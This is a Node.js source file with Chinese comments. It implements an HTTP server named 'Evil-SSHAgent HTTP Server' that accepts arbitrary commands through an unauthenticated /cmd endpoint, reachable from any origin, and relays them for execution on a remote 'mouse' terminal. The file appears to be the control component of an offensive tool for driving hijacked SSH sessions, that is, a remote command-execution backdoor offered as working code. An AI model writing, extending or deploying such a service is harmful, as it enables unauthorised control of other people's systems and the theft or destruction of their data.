const http = require('http');
const url = require('url');
const { executeRemoteCommand } = require('../command/executor');

// 存储终端管理器和终端ID的引用
let terminalManagerRef = null;
let mouseTerminalIdRef = null;

/**
 * 设置终端管理器和终端ID引用
 * @param {object} terminalManager - 终端管理器实例
 * @param {string} mouseTerminalId - mouse终端ID
 */
function setTerminalReferences(terminalManager, mouseTerminalId) {
    terminalManagerRef = terminalManager;
    mouseTerminalIdRef = mouseTerminalId;
}

/**
 * 创建HTTP服务器
 * @param {number} port - 服务器端口
 * @returns {http.Server} HTTP服务器实例
 */
function createHttpServer(port = 8080) {
    const server = http.createServer(async (req, res) => {
        // 设置CORS头
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

        // 处理OPTIONS请求
        if (req.method === 'OPTIONS') {
            res.writeHead(200);
            res.end();
            return;
        }

        // 解析URL
        const parsedUrl = url.parse(req.url, true);
        const pathname = parsedUrl.pathname;

        console.log(`收到请求: ${req.method} ${pathname}`);

        try {
            if (pathname === '/cmd') {
                await handleCommandRoute(req, res);
            } else if (pathname === '/health') {
                handleHealthRoute(res);
            } else if (pathname === '/') {
                handleRootRoute(res);
            } else {
                handleNotFoundRoute(res);
            }
        } catch (error) {
            handleError(res, error);
        }
    });

    server.listen(port, () => {
        console.log(`HTTP服务器已启动，监听端口: ${port}`);
    });

    return server;
}

/**
 * 处理命令执行路由
 * @param {http.IncomingMessage} req - HTTP请求对象
 * @param {http.ServerResponse} res - HTTP响应对象
 */
async function handleCommandRoute(req, res) {
    // 检查终端是否已初始化
    if (!terminalManagerRef || !mouseTerminalIdRef) {
        const errorResponse = {
            success: false,
            error: 'Terminal not initialized',
            timestamp: new Date().toISOString()
        };
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(errorResponse));
        return;
    }

    try {
        // 解析URL参数
        const parsedUrl = url.parse(req.url, true);
        let command = parsedUrl.query.command;

        // 如果是POST请求，尝试从请求体中获取命令
        if (req.method === 'POST') {
            const postData = await getPostData(req);
            const bodyParams = new URLSearchParams(postData);
            command = bodyParams.get('command') || command;
        }

        // 验证命令是否存在
        if (!command) {
            const errorResponse = {
                success: false,
                error: 'Command parameter is required',
                timestamp: new Date().toISOString()
            };
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(errorResponse));
            return;
        }

        // 通过预创建的终端执行远程命令
        const result = await executeRemoteCommand(command, terminalManagerRef, mouseTerminalIdRef);
        
        // 返回执行结果（包含输出文件路径，指导用户如何查看结果）
        const successResponse = {
            success: true,
            command: command,
            result: result.stdout,
            error: result.stderr,
            exitCode: result.exitCode,
            timestamp: new Date().toISOString(),
            message: "命令已发送到远程终端执行。如果命令有输出，结果将保存到指定的文件中。请在远程终端上使用 'cat <文件路径>' 命令查看结果。"
        };

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(successResponse));
    } catch (error) {
        console.error('执行命令时出错:', error);
        const errorResponse = {
            success: false,
            command: command,
            error: error.message,
            timestamp: new Date().toISOString()
        };
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(errorResponse));
    }
}

/**
 * 处理健康检查路由
 * @param {http.ServerResponse} res - HTTP响应对象
 */
function handleHealthRoute(res) {
    const healthResponse = {
        status: 'healthy',
        service: 'Evil-SSHAgent HTTP Server',
        version: '1.0.0',
        timestamp: new Date().toISOString()
    };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(healthResponse));
}

/**
 * 处理根路由
 * @param {http.ServerResponse} res - HTTP响应对象
 */
function handleRootRoute(res) {
    const infoResponse = {
        service: 'Evil-SSHAgent HTTP Server',
        version: '1.0.0',
        endpoints: [
            'GET /health - 健康检查',
            'GET/POST /cmd?command=<command> - 执行远程命令',
            'POST /cmd with body: command=<command> - 执行远程命令'
        ],
        timestamp: new Date().toISOString()
    };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(infoResponse));
}

/**
 * 处理404路由
 * @param {http.ServerResponse} res - HTTP响应对象
 */
function handleNotFoundRoute(res) {
    const notFoundResponse = {
        success: false,
        error: 'Endpoint not found',
        available_endpoints: ['/health', '/cmd', '/'],
        timestamp: new Date().toISOString()
    };
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(notFoundResponse));
}

/**
 * 处理错误情况
 * @param {http.ServerResponse} res - HTTP响应对象
 * @param {Error} error - 错误对象
 */
function handleError(res, error) {
    console.error('处理请求时出错:', error);
    const errorResponse = {
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
    };
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(errorResponse));
}

/**
 * 获取POST请求数据
 * @param {http.IncomingMessage} req - HTTP请求对象
 * @returns {Promise<string>} 请求体数据
 */
function getPostData(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            resolve(body);
        });
        req.on('error', error => {
            reject(error);
        });
    });
}

module.exports = {
    createHttpServer,
    setTerminalReferences
};